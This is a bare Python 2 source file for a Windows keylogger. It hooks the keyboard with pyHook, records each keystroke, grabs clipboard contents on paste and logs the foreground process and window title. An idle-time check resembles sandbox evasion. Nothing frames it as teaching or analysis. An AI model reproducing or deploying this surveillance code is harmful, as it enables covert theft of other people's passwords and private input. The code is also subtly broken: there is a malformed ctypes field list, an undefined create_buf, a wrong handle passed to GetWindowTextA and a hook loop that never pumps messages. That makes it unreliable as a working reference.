from ctypes import *
import PythonCom
import pyHook
import win32clipboard
import random
import time
import sys

psapi = windll.psapi
current_w=None
user32 = windll.user32
kernel32 = windll.kernel32

class Input(Structure):
    _fields_ = [("cbsize",c_uint),"downtime",c_ulong]

    def get_input(self):
        struct_lastinput = Input()
        struct_lastinput.cbsize = sizeof(Input)
        user32.GetLastInputInfo(byref(struct_lastinput))
        rt = kernel32.GetTickCount()
        el = rt - struct_lastinput.downtime
        return el



def get_pid():
    handle = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(handle,byref(pid))
    pid = "%d"%pid.value
    exe  = create_buf("\x00"*1024)
    h_proc = kernel32.OpenProcess(0x400|0x10,0,pid)
    psapi.GetModuleBaseNameA(h_proc,None,byref(exe),1024)

    win_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(h_proc,byref(win_title),512)
    print "[PID: %s - %s - %s]" %(pid,exe.value,win_title.value)
    print

    kernel32.CloseHandle(handle)
    kernel32.CloseHandle(h_proc)


def keylogger(event):
    global current_w
    if event.WindowName != current_w:
        current_w = event.WindowName
        get_pid()

    if event.Ascii >32 and event.Ascii<127:
        print chr(event.Ascii)
    else:
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            paste = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print "[paste] - %s"%(paste)
        else:
            print "%s" %event.Key
    return 1



if __name__ == '__main__':
    while 1:
        el = Input().get_input()
        if not el < 60000:
            keystrokes = 0
            mouse_click = 0
            double_click = 0

            keylog = pyHook.HookManager()
            keylog.KeyDown = keylogger
            keylog.HookKeyboard()
